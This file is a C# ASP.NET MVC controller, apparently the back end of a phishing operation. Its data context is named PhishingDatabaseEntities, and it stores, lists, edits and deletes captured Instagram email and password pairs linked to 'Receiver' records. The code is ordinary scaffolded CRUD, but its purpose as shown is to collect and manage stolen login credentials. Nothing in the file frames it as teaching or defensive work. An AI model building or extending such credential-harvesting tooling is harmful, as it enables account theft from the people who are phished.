using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Entity;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.Mvc;
using WebApplicationMVC2.Models;

namespace WebApplicationMVC2.Controllers
{
    public class InstagramLoginsController : Controller
    {
        private PhishingDatabaseEntities db = new PhishingDatabaseEntities();

        // GET: InstagramLogins
        public ActionResult Index()
        {
            var instagramLogin = db.InstagramLogin.Include(i => i.Receiver);
            return View(instagramLogin.ToList());
        }

        // GET: InstagramLogins/Details/5
        public ActionResult Details(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            InstagramLogin instagramLogin = db.InstagramLogin.Find(id);
            if (instagramLogin == null)
            {
                return HttpNotFound();
            }
            return View(instagramLogin);
        }

        // GET: InstagramLogins/Create
        public ActionResult Create()
        {
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID");
            return View();
        }

        // POST: InstagramLogins/Create
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details see https://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Create([Bind(Include = "ID,Email,Password,DateEntered")] InstagramLogin instagramLogin)
        {
            if (ModelState.IsValid)
            {
                db.InstagramLogin.Add(instagramLogin);
                db.SaveChanges();
                return RedirectToAction("Index");
            }

            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", instagramLogin.ID);
            return View(instagramLogin);
        }

        // GET: InstagramLogins/Edit/5
        public ActionResult Edit(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            InstagramLogin instagramLogin = db.InstagramLogin.Find(id);
            if (instagramLogin == null)
            {
                return HttpNotFound();
            }
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", instagramLogin.ID);
            return View(instagramLogin);
        }

        // POST: InstagramLogins/Edit/5
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details see https://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult Edit([Bind(Include = "ID,Email,Password,DateEntered")] InstagramLogin instagramLogin)
        {
            if (ModelState.IsValid)
            {
                db.Entry(instagramLogin).State = EntityState.Modified;
                db.SaveChanges();
                return RedirectToAction("Index");
            }
            ViewBag.ID = new SelectList(db.Receiver, "ID", "ID", instagramLogin.ID);
            return View(instagramLogin);
        }

        // GET: InstagramLogins/Delete/5
        public ActionResult Delete(int? id)
        {
            if (id == null)
            {
                return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
            }
            InstagramLogin instagramLogin = db.InstagramLogin.Find(id);
            if (instagramLogin == null)
            {
                return HttpNotFound();
            }
            return View(instagramLogin);
        }

        // POST: InstagramLogins/Delete/5
        [HttpPost, ActionName("Delete")]
        [ValidateAntiForgeryToken]
        public ActionResult DeleteConfirmed(int id)
        {
            InstagramLogin instagramLogin = db.InstagramLogin.Find(id);
            db.InstagramLogin.Remove(instagramLogin);
            db.SaveChanges();
            return RedirectToAction("Index");
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                db.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
